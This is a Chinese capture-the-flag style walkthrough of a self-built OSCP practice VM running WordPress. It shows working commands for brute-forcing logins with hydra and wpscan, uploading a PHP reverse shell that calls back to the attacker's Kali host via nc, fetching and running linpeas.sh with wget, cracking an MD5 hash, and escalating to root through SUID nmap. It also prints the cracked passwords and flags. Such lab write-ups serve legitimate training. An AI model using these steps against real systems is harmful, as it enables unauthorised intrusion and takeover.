# 简介

该项目是Leon
Johnson作者精心制作的项目，目标是获取获得root权限并找到flag.txt文本信息，该项目作为OSCP考试培训必打的一个项目环境，该作者评定该环境为渗透中级水准难度。接下来不管是零基础学习渗透者，还是有些基础的渗透者，甚至是高水平的渗透人员读该的技巧和文章都能学习到一些红队知识。

该项目有始有终会用到 信息收集 -> WEB信息枚举 -> 暴力破解 -> wpscan枚举 -> worepress站getshell -> 内网信息收集
-> 提权 ，最终拿到flag.txt的过程，那么在八大模块中用到了一些小技巧都会在文章中演示出来，希望大家能动手也来和我一起学习渗透。

请注意：

本文仅用于技术讨论与研究，对于所有笔记中复现的这些终端或者服务器，都是自行搭建的环境进行渗透的。我将使用Kali
Linux作为此次学习的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，本站及作者概不负责。

# 一、信息收集

信息收集非常重要，有了信息才能知道下一步该如何进行，接下来将用nmap来演示信息收集：

## 1、nmap扫描存活IP

由于本项目环境是nat模式需要项目IP地址，扫描挖掘本地的IP地址信息：

![202209141345796.png](https://image.3001.net/images/20230113/1673575814_63c0bd866b87153b84961.png!small)

本机IP为：192.168.40.177。

发现本kali ip为40段！用40段进行全网段扫描：

    
    
    nmap -sP 192.168.40.0/24

![202209141345797.png](https://image.3001.net/images/20230113/1673575815_63c0bd8791f49274fc163.png!small)

Nmap scan report for localhost (192.168.40.191)

发现项目IP地址：192.168.40.191。

## 2、nmap全端口服务枚举

进行namp端口服务枚举：

    
    
    nmap -p- 192.168.40.191

![202209141345798.png](https://image.3001.net/images/20230113/1673575816_63c0bd887b890a29751df.png!small)

得到开放的端口信息：

    
    
    22/tcp  closed ssh
    80/tcp  open   http
    443/tcp open   https

只开启了页面端口，接下来进行web页面枚举！

# 二、web信息枚举

## 1、web页面枚举

访问80端口，并查看源码：

    
    
    http://192.168.40.191/

![202209141345799.png](https://image.3001.net/images/20230113/1673575817_63c0bd8977f28416a89eb.png!small)

发现是个js页面，没有什么可用的信息！

## 2、dirb爆破目录

利用dirb爆破目录信息枚举：

    
    
    dirb http://192.168.40.191/

![202209141345800.png](https://image.3001.net/images/20230113/1673575818_63c0bd8a90141c042185e.png!small)

发现多级目录，大致访问下发现如下信息；

wordpress博客登录界面：

    
    
    http://192.168.40.191/wp-login.php

![202209141345801.png](https://image.3001.net/images/20230113/1673575819_63c0bd8b863ab7bc9f136.png!small)

需要查找登录账户密码

枚举出存在robots.txt：

    
    
    http://192.168.40.191/admin/robots.txt

![202209141345802.png](https://image.3001.net/images/20230113/1673575820_63c0bd8c602f455abfd62.png!small)

发现fsocity.dic和key-1-of-3.txt

    
    
    http://192.168.40.191/robots.txt

![202209141345803.png](https://image.3001.net/images/20230113/1673575821_63c0bd8d1a2f735d229bb.png!small)

## 3、获得flag1

    
    
    wget http://192.168.40.191/key-1-of-3.txt 
    ls
    cat key-1-of-3.txt

![202209141345804.png](https://image.3001.net/images/20230113/1673575821_63c0bd8df219d53ccb281.png!small)

下载fsocity.dic

    
    
    wget http://192.168.40.191/fsocity.dic
    ls

![202209141345805.png](https://image.3001.net/images/20230113/1673575823_63c0bd8f269e62532b591.png!small)

发现这就是个字典，改为txt文件方便后面利用：

    
    
    mv fsocity.dic user.txt

![202209141345806.png](https://image.3001.net/images/20230113/1673575824_63c0bd9046a75812619bc.png!small)

# 三、暴力破解

## 1、BP抓包分析

利用BP抓包分析：

    
    
    http://10.211.55.49/wp-login.php

![202209141345807.png](https://image.3001.net/images/20230113/1673575825_63c0bd91396f17f9aebd2.png!small)

发现boby:

    
    
    log=1&pwd=1&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.40.191%2Fwp-admin%2F&testcookie=1

## 2、hydra爆破

运用hydra爆破字典，获取登录账户：

    
    
    hydra -L user.txt -p test 192.168.40.191 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
    -L 用户名,运用字典user.txt
    -p  单个密码，任拟
    192.168.40.191 目标IP
    http-post-form 表示破解是采用http的post方式提交的表单密码破解
    F=  内容是表示错误猜解的返回信息提示

![202209141345808.png](https://image.3001.net/images/20230113/1673575826_63c0bd9224a85705c7e31.png!small)

成功爆破出用户名：Elliot

    
    
    [80][http-post-form] host: 192.168.40.191   login: ELLIOT   password: test

# 四、wpscan枚举Elliot

## 1、wpscan爆破密码

    
    
    wpscan -U Elliot -P user.txt --url http://192.168.40.191 -t 10000

![202209141345809.png](https://image.3001.net/images/20230113/1673575827_63c0bd9327a089ef3c68b.png!small)

爆破需要一段时间，所以加入-t一万个线层进行爆破！

但是经过40分钟才可以爆破出来！

检查字典发现很多重复的，Linux sort 命令用于将文本文件内容加以排序：sort
可针对文本文件的内容，以行为单位来排序。<https://www.runoob.com/linux/linux-comm-sort.html>

## 2、sort去重

利用sort对字典进行去重：

    
    
    sort user.txt | uniq > user1.txt
    -u, --unique 配合-c，严格校验排序；不配合-c，则只输出一次排序结果

![202209141345810.png](https://image.3001.net/images/20230113/1673575828_63c0bd945ae174cb79ae3.png!small)

![202209141345811.png](https://image.3001.net/images/20230113/1673575829_63c0bd9525238ba4fdbcd.png!small)

去重后的字典缩小至9KB！

继续用wpscan爆破密码：

    
    
    wpscan -U Elliot -P user1.txt --url http://192.168.40.191

![202209141345812.png](https://image.3001.net/images/20230113/1673575830_63c0bd96244ccfa4ec8b1.png!small)

![202209141345813.png](https://image.3001.net/images/20230113/1673575831_63c0bd9735f9b9057123d.png!small)

获得密码：

    
    
    [SUCCESS] - Elliot / ER28-0652

通过不到一分钟就成功爆破了！

# 五、worepress站getshell

## 1、worepress页面信息枚举

worepress页面登录并查找上传模块：

    
    
    http://192.168.40.191 /wp-login.php 
    elliot
    ER28-0652

![202209141345814.png](https://image.3001.net/images/20230113/1673575832_63c0bd981b2cb83b68f95.png!small)

![202209141345815.png](https://image.3001.net/images/20230113/1673575832_63c0bd98f0e2d2428a854.png!small)

成功登录！

发现上传入口

点击：Appearance->Add New->Upload Theme->文件上传

![202209141345816.png](https://image.3001.net/images/20230113/1673575834_63c0bd9a1c698a6473eec.png!small)

## 2、漏洞利用

下载并配置PHP漏洞参数：

    
    
    locate php-reverse-shell.php
    cp /usr/share/webshells/php/php-reverse-shell.php .
    gedit php-reverse-shell.php

![202209141345817.png](https://image.3001.net/images/20230113/1673575835_63c0bd9b2592dc03cf54f.png!small)

配置IP为本地kali地址，端口可不变

    
    
    192.168.40.177
    1234

![202209141345818.png](https://image.3001.net/images/20230113/1673575836_63c0bd9c46da3a1e1ce32.png!small)

## 3、漏洞上传

在文件上传处上传php-reverse-shell

![202209141345819.png](https://image.3001.net/images/20230113/1673575837_63c0bd9d585a5f9eefd83.png!small)

然后点击模块：Media

点击刚上传的漏洞文件！

![202209141345820.png](https://image.3001.net/images/20230113/1673575838_63c0bd9e548814ee853f4.png!small)

右边获得上传点链接：

<http://192.168.40.191/wp-content/uploads/2022/07/php-reverse-shell.php>

![202209141345821.png](https://image.3001.net/images/20230113/1673575840_63c0bda056e7f9159d5bf.png!small)

开启nc接收shell

    
    
    nc -vlp 1234

![202209141345822.png](https://image.3001.net/images/20230113/1673575841_63c0bda1250f0341e7f35.png!small)

访问漏洞链接，获得反弹shell

    
    
    http://192.168.40.191/wp-content/uploads/2022/07/php-reverse-shell.php

![202209141345823.png](https://image.3001.net/images/20230113/1673575841_63c0bda1e3dfe4971e7e3.png!small)

成功获得反弹shell，但是这里获得的是/bin/sh的shell在执行

![202209141345824.png](https://image.3001.net/images/20230113/1673575842_63c0bda2d306e77b2b5dd.png!small)

发现是sh shell，sh不能走python shell

    
    
    which python 
    /bin/bash
    python -c 'import pty; pty.spawn("/bin/bash")'
    ctrl + z
    stty raw -echo
    fg

![202209141345825.png](https://image.3001.net/images/20230113/1673575843_63c0bda3c459890ff24b8.png!small)

获得稳定的反弹shell！

# 六、内部信息收集

## 1、信息收集

进入robot，发现flag2和密匙：

    
    
    cd /home/robot
    ls
    cat password.raw-md5

![202209141345826.png](https://image.3001.net/images/20230113/1673575845_63c0bda50b7061f9e793d.png!small)

获得以下信息：

    
    
    flag需robot权限
    robot密匙:c3fcd3d76192e4007dfb496cca67e13b

查看密码类型

    
    
    hash-identifier

![202209141345827.png](https://image.3001.net/images/20230113/1673575846_63c0bda6041d118e4d382.png!small)

发现是MD5密码

## 2、获得robot密码

在线解密：

    
    
    https://www.somd5.com/

![202209141345828.png](https://image.3001.net/images/20230113/1673575846_63c0bda6d299cccebd053.png!small)

获得密码：

    
    
    abcdefghijklmnopqrstuvwxyz

# 七、提权

## 1、flag2

su进入获得flag2：

    
    
    su robot
    abcdefghijklmnopqrstuvwxyz

![202209141345829.png](https://image.3001.net/images/20230113/1673575847_63c0bda78f732bacfe0b8.png!small)

获得flag2：

    
    
    ls
    cat key-2-of-3.txt

![202209141345831.png](https://image.3001.net/images/20230113/1673575848_63c0bda86795dc469a2a8.png!small)

flag2：822c73956184f694993bede3eb39f959

## 2、信息枚举

上传扫描脚本linpeas.sh

    
    
    python -m SimpleHTTPServer 8081
    cd /tmp
    wget http://192.168.40.177:8081/linpeas.sh

![202209141345832.png](https://image.3001.net/images/20230113/1673575849_63c0bda92f4b79aad89eb.png!small)

赋权并执行脚本：

    
    
    chmod +x linpeas.sh
    ./linpeas.sh

![202209141345833.png](https://image.3001.net/images/20230113/1673575850_63c0bdaa4d2bdc82cbf96.png!small)

内核版本：

    
    
    Linux version 3.13.0-55-generic 
    Sudo version 1.8.9p5

![202209141345834.png](https://image.3001.net/images/20230113/1673575851_63c0bdab3e7d57185b834.png!small)

计划任务：

    
    
    08 * * * * bitnami cd /opt/bitnami/stats && ./agent.bin --run -D

![202209141345835.png](https://image.3001.net/images/20230113/1673575852_63c0bdac0af47ebe0d427.png!small)

nmap权限

    
    
    -rwsr-xr-x 1 root root 493K Nov 13  2015 /usr/local/bin/nmap

![202209141345836.png](https://image.3001.net/images/20230113/1673575852_63c0bdacb2b767e25a638.png!small)

测试后内核漏洞37292.c，利用不了；计划任务 是个bin文件，提权不了

尝试nmap利用！

## 3、nmap提权

查看下有无安装nmap：

    
    
    find / -perm -4000 2>/dev/null

![202209141345837.png](https://image.3001.net/images/20230113/1673575853_63c0bdad85217495609ac.png!small)

安装了nmap

利用priv升级漏洞进行bash提权

    
    
    nmap --interactive
    或/usr/local/bin/nmap --interactive   ---即可得到交互式shell
    !whoami
    !/bin/bash -p

![202209141345838.png](https://image.3001.net/images/20230113/1673575854_63c0bdae46ad405106ad6.png!small)

成功获得root权限！

获得flag3：

    
    
    cd /root
    ls
    cat key-3-of-3.txt

![202209141345839.png](https://image.3001.net/images/20230113/1673575855_63c0bdaf2fabb38de8312.png!small)

flag3：04787ddef27c3dee1ee161b21670b4e4

